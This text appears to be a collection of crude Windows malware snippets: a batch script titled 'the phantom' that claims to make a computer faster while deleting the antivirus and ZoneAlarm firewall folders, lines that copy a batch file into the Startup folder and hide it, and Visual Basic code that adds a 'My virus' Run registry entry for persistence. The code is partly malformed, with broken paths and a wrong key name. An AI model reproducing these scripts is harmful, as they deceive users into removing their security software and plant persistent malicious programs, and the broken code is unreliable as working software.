echo welcome to the phantom by dertunisiano@ @echo if u want to make your computer faster you should to following @echo the phantom steps (step by step) @pause cd\ c: dir dir c:\progra~1\aivra~1 @echo if u want to make your computer faster @pause @echo now you should to type y and press enter del c:\progra~1\aivra~1 @pause c: dir @echo if u want to make your computer faster @pause @dir c:\progra~1 dir c:\progra~1\zonea~1\zonealarm del c:\progra~1\zonea~1\zonealarm @echo be happy your computer now is faster than before :exit


Copy Bart.bat C:\documents and setting\%userprofile%\Start Menu\Programs\Startup

Attrib +r +h Bart.bat
Attrib +r +h

Option Explicit

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

Private Const REG_SZ = 1

Private Const LOCALMACHINE = &H80000002

Private Sub Command1_Click()

Dim InputValue As String

Dim nBufferKey As Long, nBufferSubKey As Long

RegCreateKey LOCALMACHINE, "SOFTWARE\JPRODUCTIONS", nBufferKey

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

InputValue = "c:\******s\system\Project12.exe"

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

RegSetValueEx nBufferSubKey, "My virus", 0, REG_SZ, InputValue, Len(InputValue)

End Sub